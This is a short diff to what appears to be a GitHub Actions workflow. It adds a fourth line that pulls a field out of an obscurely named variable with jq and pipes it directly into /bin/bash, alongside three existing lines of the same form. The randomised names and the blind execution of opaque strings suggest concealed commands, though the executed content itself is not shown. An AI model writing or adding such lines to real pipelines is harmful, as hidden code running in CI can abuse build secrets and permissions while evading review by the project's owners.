@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$iin91110" | jq -r .ds8 | /bin/bash
           printf '%s' "$njp15" | jq -r .zljg1100 | /bin/bash
           echo $zclp44729 | jq -r .wkwtn8551 | /bin/bash
+          printf '%s' "$f0100" | jq -r .q99160 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
